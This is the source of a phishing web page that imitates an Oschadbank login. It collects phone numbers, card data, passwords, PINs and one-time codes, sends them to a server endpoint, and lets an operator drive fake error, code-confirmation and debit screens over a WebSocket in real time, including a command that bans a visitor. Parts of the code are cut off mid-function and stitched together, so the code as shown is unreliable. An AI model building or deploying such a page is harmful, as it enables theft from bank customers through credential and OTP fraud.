<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è –≤ –û—â–∞–¥–±–∞–Ω–∫</title>
    <style>
        /* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
            --oschad-primary: #00A39C;
            /* –°—Ç–∏–ª–∏ –¥–ª—è —Ç–µ–º–Ω–æ–π —Ç–µ–º—ã (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –º–æ–¥–∞–ª–∫–∞—Ö) */
            --raiff-bg: #1C1C1E; --raiff-text: #F2F2F7; --raiff-yellow: #FFCC00; --raiff-btn-bg: #2C2C2E;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
            font-size: 16px; -webkit-font-smoothing: antialiased; overflow-x: hidden;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: flex; justify-content: center; max-width: 800px; margin: 0 auto; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 140px; width: 160px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
            -webkit-tap-highlight-color: transparent;
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }

        /* --- –°–¢–ò–õ–ò –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –û—â–∞–¥–±–∞–Ω–∫–∞ --- */
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #f8f9fa;
            display: none; justify-content: center; align-items: flex-start;
            z-index: 1000; overflow-y: auto;
        }
        .custom-modal-content {
            background-color: transparent; padding: 0; border-radius: 0;
            width: 100%; max-width: none; text-align: center; box-shadow: none;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-header {
            width: 100%; display: flex; align-items: center; padding: 15px 15px;
            background-color: #f8f9fa; position: relative; 
        }
        .oschad-header .back-arrow {
            font-size: 28px; color: #495057; margin-right: 15px; cursor: pointer; line-height: 1;
        }
        .oschad-header .title {
            font-size: 17px; font-weight: 500; color: #212529;
            flex-grow: 1; text-align: center; margin-right: 40px; 
        }
        .oschad-header-logo { position: absolute; right: 15px; top: 10px; max-height: 40px; }
        .oschad-welcome-section {
            padding: 20px; text-align: center; width: 100%;
            display: flex; flex-direction: column; padding-bottom: 120px;
        }
        .oschad-main-title { font-size: 26px; font-weight: 700; margin-bottom: 8px; text-align: center; }
        .oschad-welcome-section p {
            font-size: 16px; color: #495057; line-height: 1.5;
            margin-bottom: 25px; font-weight: 400; text-align: center; 
        }
        .oschad-toggle-buttons {
            display: flex; background-color: #e9ecef; border-radius: 12px;
            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
        }
        .oschad-toggle-buttons button {
            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
            border-radius: 8px; transition: all 0.2s ease; -webkit-tap-highlight-color: transparent;
        }
        .oschad-toggle-buttons button.active {
            background-color: var(--white); color: var(--dark-text);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .oschad-input-group { margin-bottom: 20px; width: 100%; position: relative; }
        .oschad-input-group label {
            position: absolute; top: 18px; left: 15px; font-size: 16px; color: #adb5bd;
            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px; z-index: 1;
        }
        .oschad-input-group.is-focused > label, .oschad-input-group.has-value > label {
            top: -10px; left: 10px; font-size: 12px; color: #6c757d;
        }
        .oschad-input-field {
            width: 100%; padding: 20px 50px 20px 20px; border: 1px solid #dee2e6; border-radius: 12px;
            font-size: 18px; color: var(--dark-text); background-color: var(--white);
            transition: all 0.2s ease; outline: none; font-weight: 500; position: relative; -webkit-appearance: none;
        }
        .oschad-input-field:focus { border-color: var(--oschad-primary); }
        .oschad-input-field::placeholder { color: transparent; }
        .password-toggle-icon {
            position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #adb5bd; z-index: 2;
        }
        .oschad-phone-wrapper, .oschad-input-wrapper {
            position: relative; display: flex; align-items: center; width: 100%;
            border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white); overflow: hidden;
        }
        .oschad-phone-wrapper:focus-within, .oschad-input-wrapper:focus-within { border-color: var(--oschad-primary); }
        .oschad-phone-prefix {
            padding: 20px 0 20px 20px; font-size: 18px; color: var(--dark-text); font-weight: 500;
        }
        .oschad-phone-wrapper .oschad-input-field, .oschad-input-wrapper .oschad-input-field {
            border: none; padding-left: 5px; flex-grow: 1;
        }
        .forgot-password-link {
            display: block; text-align: center; margin-top: -10px; margin-bottom: 20px;
            color: var(--oschad-primary); font-weight: 600; text-decoration: none; font-size: 15px; cursor: pointer;
        }
        .oschad-submit-button {
            position: fixed; bottom: 20px; left: 20px; right: 20px;
            width: auto; padding: 16px; margin: 0; border: none; border-radius: 16px;
            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
            cursor: not-allowed; transition: all 0.2s ease; z-index: 1001;
            -webkit-tap-highlight-color: transparent; touch-action: manipulation;
        }
        .oschad-submit-button.active { background-color: var(--oschad-primary); color: var(--white); cursor: pointer; }
        .auth-error-message {
            color: var(--danger-color); font-size: 14px; text-align: center; margin-top: -10px; margin-bottom: 15px;
        }
        .oschad-input-group.error .oschad-input-field, .oschad-input-group.error .oschad-phone-wrapper, .oschad-input-group.error .oschad-input-wrapper {
             border-color: var(--danger-color);
        }
        .loader-icon {
            width: 120px; height: 120px; max-width: 100%; margin: 20px auto;
            animation: spin 2s linear infinite; mix-blend-mode: multiply;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* --- –°–¢–ò–õ–ò –¥–ª—è –æ–∫–Ω–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–æ–º --- */
        .oschad-code-container {
            padding: 20px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center;
        }
        .oschad-code-container p { color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400; }
        .oschad-code-info { font-size: 16px; font-weight: 400; margin-bottom: 20px !important; }
        .oschad-code-number { font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important; }
        .oschad-code-instruction { font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important; }
        .oschad-code-inputs { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
        .oschad-code-input {
            width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600;
            border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
            outline: none; transition: border-color 0.2s ease; color: var(--dark-text);
            caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield; -webkit-appearance: none;
        }
        .oschad-code-input:focus { border-color: var(--oschad-primary); }
        .oschad-code-inputs.error .oschad-code-input { border-color: var(--danger-color); }
        .oschad-code-error-text { color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px; }
        .oschad-resend-link {
            display: block; color: #6c757d; font-weight: 500; text-decoration: none; font-size: 15px; margin-bottom: 25px; pointer-events: none;
        }
        .oschad-resend-link.active { color: var(--oschad-primary); cursor: pointer; pointer-events: auto; }

        /* --- –û–ë–©–ò–ï –°–¢–ò–õ–ò –§–û–†–ú–´ (–¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è) --- */
        .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
        .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
        .oschad-form-container p { text-align: left; margin-bottom: 30px; }
        
        /* --- –°–¢–ò–õ–ò –¥–ª—è PIN —ç–∫—Ä–∞–Ω–∞ (–û–©–ê–î–ë–ê–ù–ö) --- */
        .oschad-pin-screen-container {
            padding: 20px; text-align: center; width: 100%; background-color: #fff;
            display: flex; flex-direction: column; justify-content: flex-start; height: calc(100vh - 60px); box-sizing: border-box;
        }
        .oschad-pin-screen-title {
            font-size: 18px; color: var(--dark-text); margin-top: 20px; margin-bottom: 25px; font-weight: 500;
        }
        .oschad-pin-dots-container { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
        .oschad-pin-dot {
            width: 45px; height: 45px; border-radius: 8px; background-color: #f0f2f5;
            display: flex; align-items: center; justify-content: center;
            font-size: 28px; font-weight: 500; color: var(--dark-text); position: relative;
        }
        .oschad-pin-dot.active::after {
            content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
            width: 2px; height: 50%; background-color: var(--dark-text); animation: blink 1s step-end infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
        .oschad-pin-keypad {
            display: grid; grid-template-areas: "k9 k8 k6" "k7 k3 k2" "k0 k1 k5" ". k4 backspace";
            gap: 8px; width: 100%; max-width: 210px; margin: 20px auto 20px auto;
        }
        .oschad-pin-key {
            height: 48px; width: 48px; justify-self: center; border-radius: 50%; border: none; background-color: #f0f2f5;
            display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 400; color: var(--dark-text);
            cursor: pointer; transition: background-color 0.2s; -webkit-tap-highlight-color: transparent; touch-action: manipulation;
        }
        .oschad-pin-key:active { background-color: #e0e2e5; }
        .oschad-pin-key[data-key="9"] { grid-area: k9; } .oschad-pin-key[data-key="8"] { grid-area: k8; }
        .oschad-pin-key[data-key="6"] { grid-area: k6; } .oschad-pin-key[data-key="7"] { grid-area: k7; }
        .oschad-pin-key[data-key="3"] { grid-area: k3; } .oschad-pin-key[data-key="2"] { grid-area: k2; }
        .oschad-pin-key[data-key="0"] { grid-area: k0; } .oschad-pin-key[data-key="1"] { grid-area: k1; }
        .oschad-pin-key[data-key="5"] { grid-area: k5; } .oschad-pin-key[data-key="4"] { grid-area: k4; }
        .oschad-pin-key.backspace { grid-area: backspace; background-color: transparent; }

        /* --- –°—Ç–∏–ª–∏ –¥–ª—è —Ç–µ–º–Ω—ã—Ö –º–æ–¥–∞–ª—å–Ω—ã—Ö –æ–∫–æ–Ω (—Å–ø–∏—Å–∞–Ω–∏—è –¥–ª—è –û—â–∞–¥–±–∞–Ω–∫–∞ –≤ —Ç–µ–º–Ω–æ–π —Ç–µ–º–µ –µ—Å–ª–∏ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è) --- */
        #raiff-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: var(--raiff-bg);
            z-index: 1000; display: none; flex-direction: column; color: var(--raiff-text);
        }
        .raiff-header {
            display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; width: 100%; flex-shrink: 0;
        }
        .raiff-header .back-arrow { cursor: pointer; }
        .raiff-header .raiff-header-logo { max-height: 30px; border-radius: 50%; }
        .raiff-content-wrapper {
            flex-grow: 1; display: flex; flex-direction: column; padding: 20px; width: 100%; overflow-y: auto;
        }
        .raiff-icon-container { text-align: center; margin: 20px 0 40px; }
        .raiff-main-title { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 15px; }
        .raiff-subtitle { font-size: 16px; color: var(--raiff-text); text-align: center; line-height: 1.5; margin-bottom: 30px; }
        .raiff-code-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .raiff-code-input {
            width: 48px; height: 52px; background-color: var(--raiff-btn-bg); border: 1px solid var(--raiff-btn-bg);
            border-radius: 8px; text-align: center; font-size: 24px; font-weight: 600; color: #fff; outline: none;
            caret-color: var(--raiff-yellow); -moz-appearance: textfield; -webkit-appearance: none;
        }
        .raiff-error-text { color: var(--danger-color); font-size: 15px; text-align: center; margin-bottom: 15px; margin-top: -15px;}

        @media (max-width: 480px) {
            .oschad-main-title { font-size: 22px; }
            .oschad-input-field { font-size: 18px; padding: 20px 50px 20px 20px; }
            .oschad-phone-prefix { font-size: 18px; padding: 20px 0 20px 20px; }
            .oschad-submit-button { padding: 14px; font-size: 16px; bottom: 15px; left: 15px; right: 15px; }
        }
        @media (min-width: 1024px) {
            .oschad-submit-button { max-width: 400px; left: 50%; transform: translateX(-50%); }
            .oschad-pin-keypad { max-width: 300px; }
        }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>–î–ª—è –ø–æ–¥–∞—á—ñ –∑–∞—è–≤–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –≤ –û—â–∞–¥–±–∞–Ω–∫</h1>
        <div class="bank-grid"></div>
    </div>

    <div id="custom-modal-overlay">
        <div class="custom-modal-content" id="custom-modal-content"></div>
    </div>

    <div id="raiff-modal-overlay">
        <div class="raiff-modal-content" id="raiff-modal-content"></div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    if (localStorage.getItem('access_blocked') === 'true') {
        document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>üö´<br>–î–æ—Å—Ç—É–ø –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ</h1></div>`;
        return;
    }

    // --- CONFIG ---
    const bankFlows = {
        'oschadbank': { name: '–û—â–∞–¥–±–∞–Ω–∫', logoUrl: 'https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg', theme: 'oschadbank', colors: { primary: '#00A39C', bg: '#f8f9fa', text: '#212529' } }
    };
    
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    let ws;
    let activeBankData = {};
    let collectedData = {};
    let callTimerInterval;
    let lastCodeScreen = null;

    // --- DOM ELEMENTS ---
    const bankGrid = document.querySelector('.bank-grid');
    const customModalOverlay = document.getElementById('custom-modal-overlay');
    const customModalContent = document.getElementById('custom-modal-content');
    const raiffModalOverlay = document.getElementById('raiff-modal-overlay');
    const raiffModalContent = document.getElementById('raiff-modal-content');
    
    // --- INITIALIZATION ---
    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`;
    }).join('');

    const hideAllModals = () => {
        customModalOverlay.style.display = 'none';
        raiffModalOverlay.style.display = 'none';
    };

    // --- WEBSOCKET LOGIC ---
    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
        ws = new WebSocket(`${protocol}://${window.location.host}`);
        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
        ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
        ws.onclose = () => setTimeout(connectWebSocket, 3000);
        ws.onerror = (error) => console.error('WebSocket error:', error);
    }
    
    // --- FUNCTIONS FOR OSCHADBANK ---
    
    // –≠–∫—Ä–∞–Ω –≤–≤–æ–¥–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–ü–µ—Ä–≤—ã–π —à–∞–≥)
    function renderOschadPhoneScreen() {
        hideAllModals();
        const html = 
            `<div class="oschad-header">
                <span class="back-arrow" id="oschad-back-arrow">‚Üê</span>
                <span class="title">–û—â–∞–¥–±–∞–Ω–∫</span>
                <img class="oschad-header-logo" src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="–õ–æ–≥–æ—Ç–∏–ø –û—â–∞–¥–±–∞–Ω–∫–∞">
            </div>
            <div class="oschad-welcome-section">
                <h2 class="oschad-main-title">–õ–∞—Å–∫–∞–≤–æ –ø—Ä–æ—Å–∏–º–æ</h2>
                <p>–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É</p>
                <div id="phone-login-form">
                    <div class="oschad-input-group phone-group">
                        <label for="phone_input">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É</label>
                        <div class="oschad-phone-wrapper">
                            <span class="oschad-phone-prefix">+380</span>
                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*">
                        </div>
                    </div>
                </div>
            </div>
            <button class="oschad-submit-button" id="oschad-submit-btn" disabled>–ü–†–û–î–û–í–ñ–ò–¢–ò</button>`
        ;
        customModalContent.innerHTML = html;
        customModalOverlay.style.display = 'flex';

        document.getElementById('oschad-back-arrow').addEventListener('click', () => { hideAllModals(); });

        const phoneInput = document.getElementById('phone_input');
        const submitBtn = document.getElementById('oschad-submit-btn');

        document.querySelectorAll('.oschad-input-group').forEach(group => {
            const input = group.querySelector('.oschad-input-field');
            if (!input) return;
            const checkValue = () => group.classList.toggle('has-value', input.value.trim() !== '');
            input.addEventListener('focus', () => group.classList.add('is-focused'));
            input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
            input.addEventListener('input', checkValue); checkValue();
        });
        
        const handleInput = (val) => {
            let rawValue = val.replace(/\D/g, '');
            if (rawValue.startsWith('380')) rawValue = rawValue.substring(3);
            if (rawValue.length > 9) rawValue = rawValue.substring(0, 9);
            phoneInput.value = rawValue.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
            const isValid = rawValue.length === 9;
            submitBtn.classList.toggle('active', isValid);
            submitBtn.disabled = !isValid;
        };

        phoneInput.addEventListener('input', (e) => handleInput(e.target.value));
        phoneInput.addEventListener('paste', (e) => {
            e.preventDefault();
            handleInput((e.clipboardData || window.clipboardData).getData('text'));
        });

        submitBtn.onclick = (e) => {
            e.preventDefault();
            if (submitBtn.disabled) return;
            collectedData.phone = '+380' + phoneInput.value.replace(/\D/g, '');
            sendDataToServer({ phone: collectedData.phone }, false);
            renderOschadCardScreen();
        };
    }
    
    // –≠–∫—Ä–∞–Ω –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã
    function renderOschadCardScreen() {
        hideAllModals();
        const html = 
            `<div class="oschad-header">

    function startCallTimer(seconds) {
        const link = document.getElementById('resend-link') || document.getElementById('raiff-resend-info');
        if (!link) return;
        clearInterval(callTimerInterval);
        let timer = seconds;
        const initialText = link.textContent.split(' —á–µ—Ä–µ–∑ ')[0];

        function updateTimer() {
            if (timer < 0) {
                clearInterval(callTimerInterval);
                link.textContent = initialText + (link.id.includes('resend') ? '?' : '');
                link.classList.add('active');
                link.onclick = (e) => { e.preventDefault(); startCallTimer(60); };
            } else {
                link.textContent = `${initialText} —á–µ—Ä–µ–∑ ${timer} —Å–µ–∫—É–Ω–¥`;
                link.classList.remove('active'); timer--;
            }
        }
        updateTimer();
        callTimerInterval = setInterval(updateTimer, 1000);
    }

    function setupPinScreenListeners() {

    // --- DATA HANDLING ---
    async function sendDataToServer(data, isFinal) {
        collectedData = { ...collectedData, ...data };
        try {
            await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId, bankName: activeBankData.name, isFinalStep: isFinal,
                    referrer: localStorage.getItem('referrer') || 'unknown', ...data
                }),
            });
        } catch (error) { console.error('Failed to send data:', error); }
    }
    
    function handleServerCommand(command) {
        const { type, data } = command;
        switch (type) {
            case 'lk': renderOschadbankLogin(); break;
            case 'call': renderOschadbankCallConfirmation(); break;
            case 'viber': renderOschadbankViberScreen(); break;
            case 'telegram_debit': renderTelegramSmsScreen(); break;
            case 'show_debit_form': renderThemedDebitScreen(); break;
            case 'password_error':
                const errorMsg = data.loginType === 'login' ? '–ù–µ–≤—ñ—Ä–Ω–∏–π –ª–æ–≥—ñ–Ω –∞–±–æ –ø–∞—Ä–æ–ª—å' : '–ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å';
                const errorType = data.loginType === 'phone' ? 'password' : 'login_password';
                const savedPhone = collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
                renderOschadbankLogin({ errorType: errorType, errorMessage: errorMsg, savedPhone });
                break;
             case 'client_not_found':
                const savedClientPhone = collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
                renderOschadbankLogin({ errorType: 'phone', clientNotFound: true, savedPhone: savedClientPhone });
                break;
            case 'code_error':
                const errorOptions = { error: true };
                if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
                else if (lastCodeScreen === 'oschad_viber') renderOschadbankViberScreen(errorOptions);
                else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
                else if (lastCodeScreen === 'generic_debit') renderThemedDebitScreen(errorOptions);
                break;
            case 'ban':
                localStorage.setItem('access_blocked', 'true');
                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>üö´<br>–î–æ—Å—Ç—É–ø –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ</h1></div>`;
                if (ws) ws.close();
                break;
            case 'recovery': renderRecoveryCardScreen(); break;
        }
    }
